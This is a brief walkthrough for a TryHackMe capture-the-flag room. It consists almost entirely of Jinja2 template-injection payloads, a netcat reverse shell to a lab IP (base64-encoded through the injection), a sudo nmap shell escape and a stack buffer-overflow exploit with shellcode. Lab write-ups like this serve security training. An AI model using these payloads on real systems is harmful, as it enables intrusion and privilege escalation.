# TryHackMe room Theseus

## Task: What is the Labyrinth flag?
### YouTube video walkthrough: 
[YouTube video 1](https://youtu.be/HdeJ_-U6RZI)

### Coomand used on the video:

```
{{lipsum.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Reverse Shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.70.253 1234 >/tmp/f

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.70.253 1234 >/tmp/f' | base64 

{{lipsum.__globals__['os'].popen('echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjMz
LjE4IDEyMzQgPi90bXAvZgo= | base64 -d | sh').read()}}
```
## Task: What is the Labyrinth flag?
### YouTube video walkthrough: 
[YouTube video 2](https://youtu.be/yg4L-iKXrL4)

### Coomand used on the video:

```
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

```
sudo nmap -sn 10.71.235.0/24
```

```
nc -lvnp 9999 > labyrinth

nc 10.10.90.128 9999 < labyrinth

readelf -l /home/entrance/labyrinth | grep GNU_STACK

checksec labyrinth

cat /proc/sys/kernel/randomize_va_space
```

### Buffer overflow
```

(python3 -c "
import struct
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
nop_sled = b'\x90' * 200
# Reconstruct full address: 0x00007fff + lower 32 bits
leak = 0x00007fffffffe410  
payload = nop_sled + shellcode + b'A' * (424 - len(nop_sled) - len(shellcode)) + struct.pack('<Q', leak)
import sys
sys.stdout.buffer.write(payload)
print('id')
"; cat) | sudo -u minotaur /home/entrance/labyrinth
```
